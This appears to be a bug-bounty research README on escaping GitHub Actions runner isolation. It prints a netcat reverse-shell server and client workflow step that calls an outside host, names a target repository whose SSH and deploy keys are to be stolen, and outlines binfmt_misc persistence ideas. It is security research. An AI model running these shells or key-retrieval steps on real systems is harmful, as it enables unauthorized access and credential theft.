# INFO


This repository is for testing vulnerabilities in github Actions as per the [bug-bounty](https://bounty.github.com/targets/github-actions.html). 

Quickest way to get started is the **[example setting up a reverse shell](https://1o.fyi/x/reverse-shell-demo.db64.mp4).**

More information at [INFO](INFO), latest stats @ [.overlay](.overlay) & the latest patch @ [latest.patch](latest.patch)

#### [REPORT IS AVAILABLE HERE](https://github.com/solo-fish/SSB_GH_ACTIONS/blob/main/REPORT.md)

## Focus

Firstly respecting github, their infrastructure & the privacy of users. You're one `umount` away from bricking a host.

Github talks about the Actions targets in the link above, this specific paragraph refelcts the direction this repository is taking.

> Each repository in GitHub Actions is isolated from one another. Each job runs in a tenant which only contains resources for that single repository. **It should not be possible to access resources from another repository’s job.** ...if these primitives [hardware resources] can be abused to access resources of other repositories or users then this would be eligible for reward.

- - -

# Tools 

## create-patch

Create path takes a "[overlay](.overlay)" of both user & kernel space & returns a wormhole link to a tarball. After you manually grab the link download it & run [patcher](patcher) to apply the latest `.overlay` & create a [new patch](./latest.patch). Create patch just runs [stat-dump](stat-dump), if you want more information you can add to that script.

## reverse-shell

Attaches the github actions execution to a tcp instance of `nc`, the only dependency is the original BSD nc lib, `nc`. (note there are many versions of nc, ncat, netcat...).

There are two commands, the server will need to be hosted yourself, it will stream input to the CI steps shell, the client [is defined in the CI step](.github/workflows/reverse-shell.yml) & runs on the github actions host.

Heres an example:

### Server
```bash
nc -lvk 701.io 443
```
### [Client](https://github.com/solo-fish/ptest_github_actions/blob/main/.github/workflows/reverse-shell.yml) 
```yml
- name: reverse-shell
 run: |
   bash <(nc -v 701.io 443)
```

To see the full boot & mount process for arbitrary executables then [read here](INFO/BOOT_OR_EXEC_ARBITRARY_BINARY.md)

### Important
**Steps do not fail on their own, you need to manually cancel the step when you're finished using it.**

### [Target Repository](https://github.com/1o-fi/n)
The account on that repository has a ecdsa key as a ssh secret & the repository has a rsa deploy key, retrieving those keys, the .yml workflow file, or the random art are all goals.


### Reading resources
- https://www.man7.org/linux/man-pages/man5/proc.5.html
- https://www.man7.org/linux/man-pages/man7/cpuset.7.html
- https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html
- https://www.man7.org/linux/man-pages/man7/capabilities.7.html
- https://www.kernel.org/doc/html/latest/staging/index.html#atomic-types
- https://www.kernel.org/doc/html/latest/filesystems/index.html

### Next I'm looking at

This notification popped up for the first time... speaks about how github may be using runners.
```
Found online and idle hosted runner(s) in the current repository's organization account that matches the required labels: 'ubuntu-latest'
Waiting for a hosted runner in 'organization' to pick this job...
```

1. Using `binfmt_misc` to mount arbitrary code that persists network & process connections either **elevated** or **isolated** from the initial actions container. 
   
2. Bridging, monitoring, creating, or performing other non-damaging action on network namespaces & interfaces.

Actions are already using `binfmt_misc` in the boot & init process

### Kernel Support for miscellaneous Binary Formats (binfmt_misc)
This Kernel feature allows you to invoke almost (for restrictions see below) every program by simply typing its name in the shell. This includes for example compiled Java(TM), Python or Emacs programs.
            see: https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html

To achieve this you must tell binfmt_misc which interpreter has to be invoked with which binary. Binfmt_misc recognises the binary-type by matching some bytes at the beginning of the file with a magic byte sequence (masking out specified bits) you have supplied. Binfmt_misc can also recognise a filename extension aka .com or .exe.

```
proc-sys-fs-binfmt_misc.automount
● proc-sys-fs-binfmt_misc.automount - Arbitrary Executable File Formats File System Automount Point
     Loaded: loaded (/lib/systemd/system/proc-sys-fs-binfmt_misc.automount; static; vendor preset: enabled)
     Active: active (running) since Wed 2021-06-30 02:11:52 UTC; 16min ago
   Triggers: ● proc-sys-fs-binfmt_misc.mount
      Where: /proc/sys/fs/binfmt_misc
```


4. Kernel interaction including the creation of namespaces & devices.   
   see: https://www.systutorials.com/docs/linux/man/8-systemd-udevd-kernel.socket/

5. Storing distributed state built from synchronized pulls from the entropy pools to identify containers that share physical hardware (a curiousity of mine, mainly)
      
```

● systemd-udevd-kernel.socket - udev Kernel Socket
     Loaded: loaded (/lib/systemd/system/systemd-udevd-kernel.socket; static; vendor preset: enabled)
     Active: active (running) since Wed 2021-06-30 02:11:52 UTC; 16min ago
   Triggers: ● systemd-udevd.service
       Docs: man:systemd-udevd.service(8)
             man:udev(7)
     Listen: kobject-uevent 1 (Netlink)
      Tasks: 0 (limit: 8335)
     Memory: 0B
     CGroup: /system.slice/systemd-udevd-kernel.socket
```
